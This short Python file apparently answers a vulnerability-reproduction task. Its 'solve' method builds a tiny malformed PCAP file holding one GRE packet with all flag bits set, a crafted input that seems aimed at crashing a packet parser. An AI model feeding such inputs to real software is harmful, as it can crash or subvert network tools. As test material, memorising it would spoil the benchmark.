import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # PCAP global header (little-endian)
        gheader = struct.pack('<IHHIIII', 0xa1b2c3d4, 2, 4, 0, 0, 0xffff, 12)
        # PCAP packet header
        pheader = struct.pack('<IIII', 0, 0, 5, 5)
        # GRE packet data: flags_version=0xffff, protocol=0x0000, payload=0x41
        gre_data = struct.pack('>HH', 0xffff, 0x0000) + b'\x41'
        return gheader + pheader + gre_data
